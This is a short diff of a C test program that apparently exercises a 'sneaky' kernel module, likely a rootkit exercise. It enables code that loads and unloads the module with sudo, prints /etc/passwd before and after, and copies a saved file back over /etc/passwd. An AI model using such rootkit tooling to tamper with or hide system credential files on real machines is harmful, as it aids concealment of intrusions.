@@ -42,19 +42,20 @@ int main(void) {
   //Print Process ID
   printf("My process ID is: %d\n", PID);
 
+  printf("About to print My EDITED PASSWD PAGE!!\n");
+  system("cat /etc/passwd");
 
-  /*
   //load kernel module
   system(str);
 
-  //Tests that we hide PID in Process directory
-  //  system("ls /proc");
+  printf("PRINT MY EDITED PASSWD PAGE WITH MODULE LOADED!!!\n");
+  system("cat /etc/passwd");
 
   
   //Release kernel module 
-  //  system("sudo rmmod sneaky_mod.ko");
+  system("sudo rmmod sneaky_mod.ko");
 
-  */
+  
   
   //copy origina file back to its correct place
   system("cp /tmp/passwd /etc/passwd");
